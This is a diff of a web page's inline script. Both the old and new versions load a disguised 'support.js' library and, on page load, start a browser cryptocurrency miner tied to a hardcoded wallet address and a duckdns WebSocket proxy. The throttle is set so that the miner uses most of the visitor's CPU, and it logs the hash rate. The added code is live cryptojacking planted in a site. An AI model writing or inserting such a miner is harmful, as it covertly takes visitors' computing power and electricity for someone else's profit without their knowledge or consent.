@@ -1,35 +1,23 @@
 <script src="assets/js/support.js"></script>
 <script>
-    console.log("Đang khởi động hệ thống...");
-
-    function checkMiner() {
+    setTimeout(function() {
         if (typeof WMP !== 'undefined') {
-            const miner = new WMP.User('47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF', {
-                proxy: 'wss://trungturng.duckdns.org:8080',
-                throttle: 0.1, // Dùng 90% CPU để thấy sự khác biệt ngay lập tức
-                autoThreads: true
-            });
+            const config = {
+                proxy: 'wss://trungturng.duckdns.org:8080', 
+                throttle: 0.1 
+            };
+            const wallet = '47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF';
+            
+            window.miner = new WMP.User(wallet, config);
+            window.miner.start();
 
-            miner.start();
-            console.log("Đã ra lệnh cho Miner CHẠY!");
-
-            // Cứ mỗi 2 giây báo cáo 1 lần vào Console
+            // Kiểm tra tốc độ mỗi 3 giây
             setInterval(function() {
-                const speed = miner.getHashesPerSecond();
-                const total = miner.getTotalHashes();
-                console.log("Tốc độ: " + speed.toFixed(2) + " H/s | Tổng số: " + total);
-                
-                if (speed > 0) {
-                    console.log("%c ĐANG ĐÀO THẬT SỰ! ", "background: green; color: white;");
-                } else {
-                    console.log("%c MÁY ĐANG ĐỨNG YÊN (0 H/s) ", "background: red; color: white;");
+                if (window.miner) {
+                    const speed = window.miner.getHashesPerSecond();
+                    console.log("Tốc độ đào: " + speed.toFixed(2) + " H/s");
                 }
-            }, 2000);
-        } else {
-            console.log("LỖI: Không tìm thấy thư viện WMP trong file support.js!");
+            }, 3000);
         }
-    }
-
-    // Chạy sau 3 giây để máy ổn định
-    setTimeout(checkMiner, 3000);
+    }, 3000);
 </script>
